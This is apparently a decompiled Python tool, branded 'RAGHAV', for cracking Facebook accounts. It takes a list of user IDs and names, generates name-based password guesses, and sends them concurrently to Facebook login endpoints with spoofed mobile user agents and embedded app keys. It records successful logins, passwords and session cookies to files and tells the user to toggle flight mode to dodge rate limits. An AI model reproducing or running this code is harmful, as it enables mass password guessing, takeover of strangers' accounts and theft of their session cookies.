# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2023-12-30 17:46:12.519203

import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')
print('Loading Modules ...\n')



try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')


try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

    
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randomChoices(input_list, n):
    random_items = random.sample(input_list, n)
    result_string = ''.join(random_items) # You can change the delimiter as needed
    return result_string

def randBuildLSB():
    vchrome = str(random.randint(100,425))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[[FBAN/FB4A;FBAV/417.0.0.19.65;FBBV/442408997;FBDM/{density=1.5,width=720,height=1440}};FBLC/fr_FR;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N935F;FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randFBAN():
  VAPP = random.randint(400000000,499999999)
  ua="[FBAN/FB4A;FBAV/1727.3.0.74.284;FBBV/"+str(VAPP)+";FBDM/{density=2.1,width=780,height=1920};FBLC/ko_PT;FBRV/"+str(VAPP)+";FBCR/Docomo;FBMF/Itel LTD;FBBD/Docomo;FBPN/com.facebook.katana;FBDV/"+random.choice(models)+";FBSV/6;FBOP/5;FBCA/arm64-v8a:;]"
  return ua

def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/358923683;FBAV/291.0.0.12.110;FBDV/SM-T885ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(models)} Build/RP2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

networks = ["Telenor", "Nepal Telecom" , "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"]
def generate_FBAN():
  android_version=random.randint(3,17)
  device=random.choice(models)
  FBAV=f"{random.randint(150,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
  FBBV=random.randint(100000000,999999999)
  FBCR=random.choice(networks)
  
  ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};FBDM/"+"{density=2.5,width=1440,height=780}"+f";FBLC/en_FR;FBRV/0;FBCR/{FBCR};FBMF/Vivo;FBBD/Moto;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_version};FBOP/1;FBCA/x64:arm-v8a;]"
  return ua
  


def generate_device_dalvik():
  android_version=random.randint(3,14)
  device=random.choice(models)
  Build=f"RP1A.{randomChoices(string.digits,6)}.{randomChoices(string.digits,3)}"
  ua=f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/{Build})"
  return ua

sys.stdout.write('\x1b]2; RAGHAV\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'

def approval():
  uuid = str(os.geteuid())+"RNT"+str(os.geteuid())
  id = "RGV-"+"".join(uuid)
  os.system('clear')
  
  print("\033[1;37m [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠""")
  try:
    httpCaht = requests.get("https://github.com/raghavhero/Approval.txt").text
    if id in httpCaht:
      print("\033[1;97m >> Your Key Has Been Approved !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      print("\x1b[1;97m >> FB Ma Send Han Key Bhaii ");
      time.sleep(0.1)
      
      input(' >> Click Enter To Send Your Key ')
      
      os.system('xdg-open https://www.facebook.com/profile.php?id=100000919198119')
      
      time.sleep(1)
      
      
      exit()
      
  except: 
  	
     print(" >> Unable To Fetch Data From Server ")
     
     time.sleep(2)
     
     exit() 
     

head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo ="""
        __________                .__                  
\______   \_____     ____ |  |__ _____ ___  __ 
 |       _/\__  \   / ___\|  |  \\__  \\  \/ / 
 |    |   \ / __ \_/ /_/  >   Y  \/ __ \\   /  
 |____|_  /(____  /\___  /|___|  (____  /\_/   
        \/      \//_____/      \/     \/       

[+]↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠
[+] CREATED BY   :  RAGHAV LORD
[+] OWNER :  RAGHAV THAPA
[+] TOOL VERSION :  0.0.1

[+]↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠↠"""

def clear():
    os.system("clear")
    print(logo)    
approval()
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' CRACKING COMPLETED...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("PRESS ENTER TO RETURN TO MENU")
        exit()

def RAGHAV():   
    os.system('clear')
    print(logo)
    print(f'[1] FILE CLONE')
    print(f'[2] CONTACT OWNER')
    print('')
    select = input('SELECT MENU : ')
    if select =='1':
        method_crack()
    elif select =='2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000919198119')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RAGHAV(allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] METHOD (1) [BEST]')
    print(f'[2] METHOD (2)')
    print(f'[3] METHOD (3)')
    #print(f'[4] Method {4}')
    print(f'[0] BACK')
    print('')
    option = input('SELECT METHOD : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
   # elif option =='4':
    #    methods.append('methodD')
   #     main_crack().crack(id)
    elif option =='0':
        RAGHAV()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()
      
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('PUT FILE NAME : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAGHAV] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"enroll_misauth": "false",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=RtIsZXDWQP_kEVJmfEmria28; sb=RtIsZYtmNXpy4CCiEmBtihR1; vpd=v1%3B489x320x1.6875; locale=en_US; wl_cbv=v2%3Bclient_version%3A2344%3Btimestamp%3A1698594071; m_pixel_ratio=1.6875; wd=320x489; fr=05Zif8mwd9h8UejEG.AWXZsLK_J_1c0HZAGy5oudwO0Vg.BlLNJG.o2.AAA.0.0.BlQy-k.AWWnxniuObo',
    'dpr': '1.6875',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-J250F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"7.1.1"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}

                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [RAGHAV-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAGHAV_OK_IDs_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAGHAV_IDs_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [RAGHAV-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RAGHAV_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAGHAV] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/417.0.0.19.65;FBBV/442408997;FBDM/{density=1.5,width=720,height=1440}};FBLC/fr_FR;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N935F;FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '30994',
'X-FB-SIM-HNI': '37424',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [RAGHAV-OK] {sid} | {ps} {S}")
                    print("\r\r\033[1;33m Cookie: "+ckkk)
                    oks.append(sid)
                    open('/sdcard/RAGHAV_OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAGHAV_IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [RAGHAV-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAGHAV_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAGHAV] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/524.0.0.8870;FBBV/9512805;[FBAN/Orca-Android;FBAV/343.0.0.8.474;FBPN/com.facebook.orca;FBLC/en_US;FBBV/344064183;FBCR/SMART;FBMF/samsung;FBBD/samsung;FBDV/SM-A115F;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '30994',
'X-FB-SIM-HNI': '37924',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [RAGHAV-OK] {sid} | {ps} {S}")
                    print("\r\r\033[1;33m Cookie: "+ckkk)
                    oks.append(sid)
                    open('/sdcard/RAGHAV_OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAGHAV_IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [RAGHAV-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAGHAV_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RAGHAV] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': randBuildvsskj(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [RAGHAV-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAGHAV_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [RAGHAV-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAGHAV_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('PUT LIMIT BETWEEN 1 TO 30')
            sl = int(input('HOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example : first123,last1122,firstlast,last,etc]')
            print('')
            if sl =='':
                print('\n PUT LIMIT BETWEEN 1 TO 20')
            elif sl > 20:
                print('\nPASSWORD LIMIT SHOULD NOT BE GREATER THAN 20')
            else:
                for sr in range(sl):
                    pw.append(input(f' PASSWORD ({sr+1}) : '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}USE FLIGHT MODE BEFORE USE {S}")
            print(47*"-")
            print(f'{S} TOTAL IDs : %s ' % len(self.id))
            print(f'{S} CRACKING STARTED...')
            print(47*"-")
            with ThreadPoolExecutor(max_workers=30) as RAGHAVworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                RAGHAVworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RAGHAVworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)      
 

RAGHAV()

